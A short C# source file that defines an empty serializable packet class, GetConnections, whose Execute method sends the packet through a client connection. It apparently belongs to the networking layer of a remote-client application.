using System;
using xLightClient.Core.Networking;

namespace xLightClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetConnections : IPacket
    {
        public GetConnections()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }

}
